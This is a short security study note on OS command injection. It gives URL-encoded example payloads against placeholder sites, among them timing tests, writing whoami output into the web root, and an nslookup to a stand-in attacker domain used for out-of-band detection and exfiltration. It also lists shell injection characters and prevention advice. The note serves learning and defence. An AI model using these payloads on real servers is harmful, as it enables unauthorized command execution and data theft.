# Command injection :syringe:
Allow an attacker to execute OS commands on the server.  Occurs when a user's input is passed to a shell command without sufficient sanitization.

Example:
```sh
# Passing `echo hello` to the shell
# If this appears in the response, the command injection is successful
https://insecure-website.com/stockStatus?productID=%26%20echo%20hello%20%26

# Blind injection - using timing to determine if the command was successful
# `& ping -c 10 127.0.0.1 &` will take 10 seconds to complete
https://insecure-website.com/stockStatus?productID=%26%20ping%20-c%2010%20127.0.0.1%20%26

# Blind injection - writing to a file in the web root
# `& whoami > /var/www/static/whoami.txt &` and then fetch with https://vulnerable-website.com/whoami.txt
https://vulnerable-website.com/stockStatus?productID=%26%20whoami%20%3E%20%2Fvar%2Fwww%2Fstatic%2Fwhoami.txt%20%26

# Blind injection - DNS query to a malicious DNS server
# `& nslookup kgji2ohoyw.web-attacker.com &` and then check query logs.  DNS can also be used to exfiltrate data.
https://vulnerable-website.com/stockStatus?productID=%26%20nslookup%20kgji2ohoyw.web-attacker.com%20%26

```

Injected commands usually end with `&` to prevent subsequent commands from stopping the injected command from running.

## Injection characters
The following can all be uesd to inject commands:
```sh
&
&&
|
||
;
Newline (0x0a or \n)

# Bash specific
`
$(
```

## Prevent
1. Do not allow user input to be used in any shell commands.
1. If there's no other option, validate user input against a safelist of allowed characters or commands.

## Tools
- [Burp Proxy](https://portswigger.net/burp/documentation/desktop/tools/proxy)
- [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater)
- [BApp Store > Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)

## References
- https://portswigger.net/web-security/os-command-injection